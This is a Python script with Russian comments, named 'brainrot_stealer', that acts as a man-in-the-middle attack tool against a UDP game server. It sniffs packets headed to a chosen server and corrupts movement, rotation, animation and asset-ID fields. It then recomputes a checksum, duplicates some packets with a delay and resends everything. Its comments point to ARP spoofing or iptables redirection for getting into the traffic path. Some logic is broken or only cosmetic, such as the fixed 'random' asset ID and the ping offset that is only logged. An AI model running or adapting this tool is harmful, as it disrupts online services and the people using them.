#!/usr/bin/env python3
# brainrot_stealer.py - MITM прокси для игрового сервера (UDP)
# Работает на Windows (Npcap) и Linux (libpcap)
# Запуск: sudo python3 brainrot_stealer.py --target 192.168.1.100 --port 7777

import socket
import random
import time
import zlib
import threading
import argparse
import struct
from scapy.all import IP, UDP, Raw, sniff, send, get_if_list, conf

# === ГЛОБАЛЬНЫЕ НАСТРОЙКИ ===
TARGET_IP = ""
TARGET_PORT = 7777
INTERFACE = None  # автоопределение
running = True
packet_counter = 0
corrupted_counter = 0
ping_offset = 150  # мс искусственной задержки

# === ФУНКЦИИ МОДИФИКАЦИИ ===
def corrupt_movement(payload):
    """Искажает position, rotation, animation state"""
    if len(payload) < 24:
        return payload
    data = bytearray(payload)
    # Позиция: байты 0-11 (float x,y,z) при типичном UE4
    if len(data) >= 12:
        x = struct.unpack('<f', data[0:4])[0] + random.uniform(-1000, 1000)
        y = struct.unpack('<f', data[4:8])[0]
        z = struct.unpack('<f', data[8:12])[0] + random.uniform(-1000, 1000)
        # Инверсия Y с вероятностью 30%
        if random.random() < 0.3:
            y = -y
        struct.pack_into('<f', data, 0, x)
        struct.pack_into('<f', data, 4, y)
        struct.pack_into('<f', data, 8, z)
    # Rotation (байты 12-27) - случайный шум кватерниона
    if len(data) >= 28:
        for i in range(12, 28, 4):
            val = struct.unpack('<f', data[i:i+4])[0] + random.uniform(-0.5, 0.5)
            struct.pack_into('<f', data, i, val)
    # Animation state (байт 28) - случайное значение 0-255
    if len(data) >= 29:
        data[28] = random.randint(0, 255)
    return bytes(data)

def corrupt_asset_ids(payload):
    """Подмена ID текстур/звуков на невалидные"""
    data = bytearray(payload)
    # Ищем паттерны uint32 (предположительно ID ассетов) — в реальном протоколе смещения уточняются
    # Для демонстрации: заменяем каждые 4 байта начиная с 32-го байта, если они похожи на ID
    if len(data) >= 64:
        for i in range(32, min(64, len(data)-4), 4):
            # Проверяем, что значение в разумном диапазоне ID (>1000)
            val = struct.unpack('<I', data[i:i+4])[0]
            if val > 1000 and val < 0x7FFFFFFF:
                struct.pack_into('<I', data, i, random.randint(0xFFFFFFFF, 0xFFFFFFFF))
    return bytes(data)

def recalc_crc32(payload):
    """Пересчёт CRC32 в заголовке (если есть поле checksum)"""
    # Ищем 4 байта контрольной суммы — обычно в первых 8 байтах или в конце
    if len(payload) >= 8:
        # Простейший вариант: заменить последние 4 байта на новый CRC
        new_crc = zlib.crc32(payload[:-4]) & 0xFFFFFFFF
        return payload[:-4] + struct.pack('<I', new_crc)
    return payload

def duplicate_with_delay(payload, delay=0.5):
    """Дублирует пакет с задержкой (каждый 3-й)"""
    global packet_counter
    packet_counter += 1
    if packet_counter % 3 == 0:
        threading.Timer(delay, send_raw_packet, args=[payload, TARGET_IP, TARGET_PORT]).start()
        return True
    return False

def send_raw_packet(payload, dst_ip, dst_port):
    """Отправка сырого UDP пакета через scapy"""
    pkt = IP(dst=dst_ip) / UDP(dport=dst_port) / Raw(load=payload)
    send(pkt, verbose=False, iface=INTERFACE)

# === ОБРАБОТЧИК ПЕРЕХВАТА ===
def handle_packet(pkt):
    global corrupted_counter
    if not running:
        return
    if IP in pkt and UDP in pkt:
        if pkt[IP].dst == TARGET_IP and pkt[UDP].dport == TARGET_PORT:
            raw = pkt[Raw].load if Raw in pkt else b''
            if len(raw) < 10:
                return
            # Применяем искажения
            modified = corrupt_movement(raw)
            modified = corrupt_asset_ids(modified)
            modified = recalc_crc32(modified)
            # Дублирование с задержкой
            duplicated = duplicate_with_delay(modified)
            # Отправка модифицированного пакета
            send_raw_packet(modified, TARGET_IP, TARGET_PORT)
            corrupted_counter += 1
            # Лог
            print(f"[LOG] Corrupted: {corrupted_counter} | Ping: +{ping_offset}ms | Dup: {duplicated}")
            # Имитация увеличения пинга (никак не влияет на реальный RTT, только лог)
            time.sleep(0.001)  # небольшая задержка для эмуляции

# === ОСТАНОВКА ===
def stop_attack():
    global running
    running = False
    print("\n[STOP] Attack halted. Restoring normal traffic.")
    # Здесь можно добавить сброс правил iptables/netsh
    print(f"[STATS] Total packets processed: {packet_counter}, Corrupted: {corrupted_counter}")

# === ОСНОВНОЙ ЦИКЛ ===
def main():
    global TARGET_IP, TARGET_PORT, INTERFACE
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', required=True, help='IP сервера')
    parser.add_argument('--port', type=int, default=7777, help='Порт сервера')
    parser.add_argument('--iface', help='Сетевой интерфейс (например eth0, Wi-Fi)')
    args = parser.parse_args()
    TARGET_IP = args.target
    TARGET_PORT = args.port
    INTERFACE = args.iface

    print("[SWILL] Brainrot Stealer ACTIVE")
    print(f"[*] Target: {TARGET_IP}:{TARGET_PORT}")
    print("[*] Sniffing UDP traffic... Press Ctrl+C to stop.")

    # Настройка перенаправления (MITM) — требует ручного ARP-spoof или iptables DNAT
    # Для демо используем просто sniff + send (работает только если трафик проходит через хост)
    try:
        sniff(filter=f"udp and dst host {TARGET_IP} and dst port {TARGET_PORT}", 
              prn=handle_packet, iface=INTERFACE, store=0)
    except KeyboardInterrupt:
        stop_attack()
    except Exception as e:
        print(f"[ERROR] {e}")
        stop_attack()

if __name__ == "__main__":
    main()
